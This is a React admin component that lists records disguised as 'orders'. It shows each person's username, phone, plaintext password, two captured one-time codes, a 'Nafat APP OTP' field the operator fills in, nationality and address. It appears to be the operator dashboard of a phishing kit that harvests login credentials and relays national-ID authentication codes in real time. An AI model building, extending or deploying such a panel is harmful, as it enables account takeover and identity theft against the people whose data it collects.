import React, { useEffect, useState } from 'react'

const UserDetailsTable = () => {
  const [orders, setOrders] = useState([])
  // fetch all the data from api localhost:3000/api/admin/orders
  useEffect(() => {
    fetch(`${process.env.API_URL}/api/admin/orders`)
      .then((res) => res.json())
      .then((data) => {
        setOrders(data)
      })
      .catch((err) => {
        console.log(err)
      })
  }, [])

  const handleUpdateSubmit = (index) => {
    const submitData = {
      nafatOtp: document.getElementsByName('nafatOtp')[index].value,
    }

    if (submitData.nafatOtp === '') {
      toast.error('Please enter your nafat otp')
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(`${process.env.API_URL}/api/admin/orders/${orders[index]._id}`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            toast.success('Nafat OTP updated successfully')
            setOrders(data)
          } else {
            toast.error('Please enter correct otp')
          }
        })
    }
  }

  const handleUpdate = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="flex">
        <input
          type="text"
          name="nafatOtp"
          className="w-20 px-2 py-1 border rounded-md outline-none"
        />
        <button
          className="px-4 py-1 ml-2 text-white bg-blue-500 rounded-md"
          onClick={() => handleUpdateSubmit(index)}
        >
          Update
        </button>
      </div>
    )
  }

  return (
    <div>
      <div className="relative overflow-x-auto border">
        <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
          <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 border-b">
            <tr>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                #ID
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Username
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Phone
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Password
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                First OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Second OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat APP OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Country
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Address
              </th>
            </tr>
          </thead>
          <tbody>
            {orders.length > 0 ? (
              orders.map((order, index) => (
                <tr key={index}>
                  <td className="px-6 py-4">{index + 1}</td>
                  <td className="px-6 py-4">{order.identity}</td>
                  <td className="px-6 py-4">{order.phone}</td>
                  <td className="px-6 py-4">{order.password}</td>
                  <td className="px-6 py-4">{order.firstOtp}</td>
                  <td className="px-6 py-4">{order.secondOtp}</td>
                  <td className="px-6 py-4">
                    {order.nafatOtp === 0
                      ? handleUpdate(index)
                      : order.nafatOtp}
                  </td>
                  <td className="px-6 py-4">{order.nationality}</td>
                  <td className="px-6 py-4">
                    {order.address.addressDetails != '' &&
                    order.address.city != '' &&
                    order.address.country != ''
                      ? `${order.address.addressDetails}, ${order.address.city},
                    ${order.address.country}`
                      : 'No Data Found'}
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td className="px-6 py-4">No Data Found</td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  )
}

export default UserDetailsTable
